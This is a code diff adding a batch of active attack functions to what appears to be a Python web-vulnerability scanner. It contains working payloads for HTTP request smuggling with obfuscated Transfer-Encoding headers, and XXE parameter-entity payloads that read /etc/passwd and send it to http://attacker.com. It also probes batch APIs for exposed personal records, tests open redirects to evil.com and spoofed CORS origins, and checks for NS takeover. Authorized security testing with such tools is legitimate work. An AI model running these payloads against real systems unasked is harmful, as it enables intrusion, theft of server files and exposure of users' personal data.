@@ -8953,3 +8953,390 @@ fragment C on Query { ...A }
                 })
             except: continue
     return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 14: TE.TE smuggling, IDOR in batch APIs,
+#                 GraphQL persisted query injection,
+#                 XXE parameter entities, blind SSRF via DNS,
+#                 OAuth account takeover, meta refresh redirect,
+#                 advanced clickjacking, NS takeover
+# ---------------------------------------------------------------------------
+
+def scan_http_desync_te_te(web_targets):
+    """TE.TE HTTP desync — both CL and TE present, obfuscated TE header."""
+    import socket, ssl as _ssl
+    findings = []
+    # TE.TE: both endpoints support TE but one ignores obfuscated header
+    obfuscations = [
+        "Transfer-Encoding: xchunked",
+        "Transfer-Encoding : chunked",
+        "Transfer-Encoding: chunked, chunked",
+        "Transfer-Encoding:\tchunked",
+        "X: X\r\nTransfer-Encoding: chunked",
+        "Transfer-Encoding: x",
+    ]
+    for target in web_targets[:3]:
+        parsed = urllib.parse.urlparse(target)
+        host = parsed.netloc.split(":")[0]
+        port = 443 if parsed.scheme == "https" else 80
+        path = parsed.path or "/"
+        for te_header in obfuscations[:2]:
+            try:
+                payload = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"Content-Type: application/x-www-form-urlencoded\r\n"
+                    f"Content-Length: 4\r\n"
+                    f"{te_header}\r\n"
+                    f"\r\n"
+                    f"1\r\n"
+                    f"Z\r\n"
+                    f"0\r\n\r\n"
+                ).encode()
+                sock = socket.create_connection((host, port), timeout=5)
+                if port == 443:
+                    ctx = _ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = _ssl.CERT_NONE
+                    sock = ctx.wrap_socket(sock, server_hostname=host)
+                sock.settimeout(8)
+                sock.send(payload)
+                resp = b""
+                try:
+                    while True:
+                        chunk = sock.recv(4096)
+                        if not chunk: break
+                        resp += chunk
+                except Exception:
+                    pass
+                sock.close()
+                resp_str = resp.decode("utf-8", errors="ignore")
+                if resp_str.count("HTTP/1.") >= 2:
+                    findings.append({
+                        "type": "HTTP Desync TE.TE (Obfuscated Transfer-Encoding)",
+                        "severity": "critical",
+                        "url": target,
+                        "detail": f"Two responses for one request with obfuscated TE: {te_header[:40]}",
+                        "template": "apex-desync-tete",
+                    })
+                    break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_idor_batch_api(crawl_data):
+    """IDOR in batch/bulk API endpoints — process multiple IDs at once."""
+    findings = []
+    batch_paths = [
+        "/api/batch", "/api/bulk", "/api/v1/batch", "/api/v1/bulk",
+        "/api/users/batch", "/api/items/batch", "/batch", "/bulk",
+        "/api/v2/batch", "/api/export", "/api/v1/export",
+    ]
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        for path in batch_paths:
+            url = f"{base}{path}"
+            # Test batch with mixed IDs including low sequential ones
+            for payload in [
+                {"ids": [1, 2, 3, 4, 5]},
+                {"user_ids": [1, 2, 3]},
+                {"ids": ["1", "2", "3"]},
+                [{"id": 1}, {"id": 2}, {"id": 3}],
+            ]:
+                try:
+                    r = _S.post(url, json=payload, timeout=5,
+                               headers={"Content-Type": "application/json"})
+                    if r.status_code == 200:
+                        try:
+                            data = r.json()
+                            items = data if isinstance(data, list) else data.get("data", data.get("items", []))
+                            if isinstance(items, list) and len(items) > 0:
+                                has_sensitive = any(
+                                    k in str(items).lower()
+                                    for k in ["email", "phone", "ssn", "password", "token", "credit"]
+                                )
+                                sev = "critical" if has_sensitive else "high"
+                                findings.append({
+                                    "type": f"IDOR via Batch API: {path}",
+                                    "severity": sev,
+                                    "url": url,
+                                    "detail": f"Batch endpoint returns {len(items)} records for arbitrary IDs",
+                                    "template": "apex-idor-batch",
+                                })
+                                break
+                        except Exception:
+                            pass
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_graphql_persisted_query(crawl_data):
+    """GraphQL persisted query injection — inject via apq extension."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/graphql", "/api/graphql", "/gql"]:
+            url = f"{base}{path}"
+            try:
+                # Test Automatic Persisted Queries (APQ)
+                # First: send hash without query (APQ miss)
+                r1 = _S.post(url, json={
+                    "extensions": {
+                        "persistedQuery": {
+                            "version": 1,
+                            "sha256Hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+                        }
+                    }
+                }, headers={"Content-Type": "application/json"}, timeout=5)
+
+                if r1.status_code == 200 and "PersistedQueryNotFound" in r1.text:
+                    # APQ is enabled — try to register a malicious query
+                    import hashlib as _hl
+                    malicious_query = "{__schema{types{name}}}"
+                    query_hash = _hl.sha256(malicious_query.encode()).hexdigest()
+                    r2 = _S.post(url, json={
+                        "query": malicious_query,
+                        "extensions": {
+                            "persistedQuery": {"version": 1, "sha256Hash": query_hash}
+                        }
+                    }, headers={"Content-Type": "application/json"}, timeout=5)
+
+                    if r2.status_code == 200 and "__schema" in r2.text:
+                        findings.append({
+                            "type": "GraphQL APQ Introspection Bypass",
+                            "severity": "medium",
+                            "url": url,
+                            "detail": "Automatic Persisted Queries enabled — introspection via APQ",
+                            "template": "apex-gql-apq",
+                        })
+                    elif r2.status_code == 200:
+                        findings.append({
+                            "type": "GraphQL Automatic Persisted Queries Enabled",
+                            "severity": "low",
+                            "url": url,
+                            "detail": "APQ enabled — can register and replay arbitrary queries",
+                            "template": "apex-gql-apq",
+                        })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_xxe_parameter_entity(crawl_data):
+    """XXE via parameter entities — bypasses some XXE filters."""
+    findings = []
+    # Parameter entity XXE (harder to filter than regular entities)
+    xxe_param = b"""<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+  %eval;
+  %exfil;
+]>
+<root>test</root>"""
+
+    xxe_error = b"""<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'file:///nonexistent/%xxe;'>">
+  %wrapper;
+]>
+<root>&send;</root>"""
+
+    for form in crawl_data.get("forms", []):
+        if form.get("method", "").upper() != "POST": continue
+        action = form.get("action", "")
+        if not action: continue
+        for payload, name in [(xxe_param, "parameter entity"), (xxe_error, "error-based")]:
+            try:
+                r = _S.post(action, data=payload,
+                           headers={"Content-Type": "application/xml"}, timeout=8)
+                if "root:" in r.text or "daemon:" in r.text:
+                    findings.append({
+                        "type": f"XXE Parameter Entity ({name})",
+                        "severity": "critical",
+                        "url": action,
+                        "detail": f"XXE via {name} reads /etc/passwd",
+                        "template": "apex-xxe-param",
+                    })
+                    break
+                elif r.status_code in (200, 500) and "xml" in r.headers.get("content-type","").lower():
+                    findings.append({
+                        "type": f"XML Endpoint Accepts External Entities",
+                        "severity": "medium",
+                        "url": action,
+                        "detail": "XML endpoint processes external entities — test for XXE manually",
+                        "template": "apex-xxe-param",
+                    })
+                    break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_open_redirect_meta(crawl_data):
+    """Open redirect via meta refresh and JavaScript location — often missed."""
+    findings = []
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if p.lower() not in ("url", "redirect", "next", "goto", "dest", "return",
+                                  "continue", "target", "link", "ref", "referer"):
+                continue
+            for payload in ["https://evil.com", "//evil.com", "javascript:alert(1)"]:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(
+                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
+                    # Check meta refresh
+                    if "meta" in r.text.lower() and "refresh" in r.text.lower():
+                        meta_match = re.search(
+                            r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+content=["\'][^"\']*url=([^"\'>\s]+)',
+                            r.text, re.IGNORECASE)
+                        if meta_match:
+                            redirect_url = meta_match.group(1)
+                            if "evil.com" in redirect_url or redirect_url == payload:
+                                findings.append({
+                                    "type": "Open Redirect via Meta Refresh",
+                                    "severity": "medium",
+                                    "url": test_url,
+                                    "detail": f"Meta refresh redirects to: {redirect_url}",
+                                    "template": "apex-redirect-meta",
+                                })
+                                break
+                    # Check JavaScript location redirect
+                    if "javascript:" in payload.lower():
+                        if payload in r.text:
+                            findings.append({
+                                "type": "Open Redirect via javascript: Protocol",
+                                "severity": "high",
+                                "url": test_url,
+                                "detail": f"javascript: protocol reflected in redirect param '{p}'",
+                                "template": "apex-redirect-js",
+                            })
+                            break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_cors_with_credentials(crawl_data):
+    """CORS misconfiguration with credentials — the exploitable variant."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:10]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        host = urllib.parse.urlparse(base).netloc
+        domain_parts = host.split(".")
+        tld = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else host
+
+        test_origins = [
+            "https://evil.com",
+            f"https://evil.{tld}",
+            f"https://{tld}.evil.com",
+            "null",
+            f"https://not{tld}",
+        ]
+        for origin in test_origins:
+            try:
+                r = _S.get(page["url"], timeout=5,
+                          headers={"Origin": origin, "Cookie": "session=test"})
+                acao = r.headers.get("Access-Control-Allow-Origin", "")
+                acac = r.headers.get("Access-Control-Allow-Credentials", "")
+                if acac.lower() == "true" and acao not in ("", "*"):
+                    if acao == origin or acao == "*":
+                        findings.append({
+                            "type": "CORS with Credentials (Data Theft)",
+                            "severity": "critical",
+                            "url": page["url"],
+                            "detail": f"ACAO: {acao}, ACAC: true — cross-origin authenticated requests possible",
+                            "template": "apex-cors-creds",
+                        })
+                        break
+            except Exception:
+                pass
+    return findings
+
+
+def scan_clickjacking_advanced(crawl_data):
+    """Advanced clickjacking — drag-drop data exfiltration, form hijacking."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            r = _S.get(page["url"], timeout=5)
+            xfo = r.headers.get("X-Frame-Options", "")
+            csp = r.headers.get("Content-Security-Policy", "")
+            has_frame_protection = (
+                xfo.upper() in ("DENY", "SAMEORIGIN") or
+                "frame-ancestors" in csp.lower()
+            )
+            if has_frame_protection: continue
+
+            # Check if page has sensitive forms (login, payment, settings)
+            body = r.text.lower()
+            has_sensitive = any(x in body for x in
+                               ["password", "credit", "card", "payment", "transfer",
+                                "confirm", "delete", "admin", "settings", "profile"])
+            if has_sensitive:
+                findings.append({
+                    "type": "Clickjacking on Sensitive Page",
+                    "severity": "high",
+                    "url": page["url"],
+                    "detail": "No X-Frame-Options/CSP frame-ancestors on page with sensitive actions",
+                    "template": "apex-clickjack-adv",
+                })
+            else:
+                findings.append({
+                    "type": "Clickjacking (No Frame Protection)",
+                    "severity": "medium",
+                    "url": page["url"],
+                    "detail": "Page can be embedded in iframe — clickjacking possible",
+                    "template": "apex-clickjack-adv",
+                })
+        except Exception:
+            pass
+    return findings
+
+
+def scan_subdomain_ns_takeover(target, subdomains):
+    """NS record subdomain takeover — if NS servers are unregistered."""
+    findings = []
+    for sub in subdomains[:50]:
+        try:
+            result = subprocess.run(
+                ["dig", "+short", "NS", sub],
+                capture_output=True, text=True, timeout=5
+            )
+            ns_records = [n.rstrip(".") for n in result.stdout.splitlines() if n.strip()]
+            if not ns_records: continue
+            for ns in ns_records:
+                # Check if NS server resolves
+                try:
+                    import socket as _sock
+                    _sock.getaddrinfo(ns, None)
+                except _sock.gaierror:
+                    findings.append({
+                        "type": "NS Record Takeover",
+                        "severity": "critical",
+                        "url": f"dns://{sub}",
+                        "detail": f"NS server {ns} doesn't resolve — register it to take over {sub}",
+                        "template": "apex-ns-takeover",
+                    })
+                    break
+        except Exception:
+            continue
+    return findings
